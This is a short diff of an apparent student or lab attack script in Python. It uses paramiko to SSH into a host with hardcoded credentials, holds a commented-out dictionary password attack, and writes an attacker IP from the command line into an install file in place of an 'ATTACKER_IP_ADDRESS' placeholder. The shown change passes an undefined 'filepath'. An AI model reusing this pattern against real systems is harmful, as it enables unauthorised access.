@@ -7,7 +7,8 @@ import paramiko
 import fileinput
 import os
 
-def change_install_file_text(ssh):
+
+def change_install_file_text(ssh, filepath):
     with fileinput.FileInput(files="install.py", inplace=True) as file:
         for line in file:
             print(line.replace("ATTACKER_IP_ADDRESS", '"' + str(sys.argv[2]) + '"'), end='')
@@ -27,7 +28,7 @@ def main():
     ssh  = ssh_data("csc2021", "csc2021", 22)
     # ssh.passwd = dict.attack()
 
-    change_install_file_text(ssh)
+    change_install_file_text(ssh, filepath)
 
     s = paramiko.SSHClient()
     s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
